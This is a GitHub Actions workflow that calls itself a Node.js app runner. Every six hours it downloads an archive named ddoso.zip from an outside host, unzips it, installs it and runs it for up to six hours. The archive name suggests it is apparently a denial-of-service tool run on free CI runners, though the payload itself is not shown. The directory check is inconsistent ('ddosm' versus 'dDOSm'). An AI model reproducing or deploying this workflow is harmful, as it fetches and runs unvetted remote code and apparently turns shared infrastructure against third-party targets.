name: ğŸš€ Node.js App with npm start

on:
  workflow_dispatch:  # Manual trigger
  schedule:
    - cron: '0 */6 * * *'  # Every 6 hours

jobs:
  run-app:
    runs-on: ubuntu-latest
    timeout-minutes: 360  # 6 hours max
    
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
      
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '18'
      
      - name: Download and extract application
        run: |
          wget -q https://reality.mahmud-tech.online/ddoso.zip
          unzip -q ddoso.zip
          echo "ğŸ“ Extracted files:"
          ls -la
      
      - name: Find app directory and run npm start
        run: |
          # Find the app directory (ddosm or ddoso)
          if [ -d "ddosm" ]; then
            cd dDOSm
          elif [ -d "ddoso" ]; then
            cd ddoso
          else
            # Look for any directory with package.json
            APP_DIR=$(find . -name "package.json" -type f -exec dirname {} \; | head -1)
            cd "$APP_DIR"
          fi
          
          echo "ğŸ“ Working directory: $(pwd)"
          echo "ğŸ“„ package.json:"
          cat package.json
          
          # Install dependencies
          echo "ğŸ“¦ Installing dependencies..."
          npm install --legacy-peer-deps
          
          # Run npm start
          echo "ğŸš€ Running npm start..."
          npm start
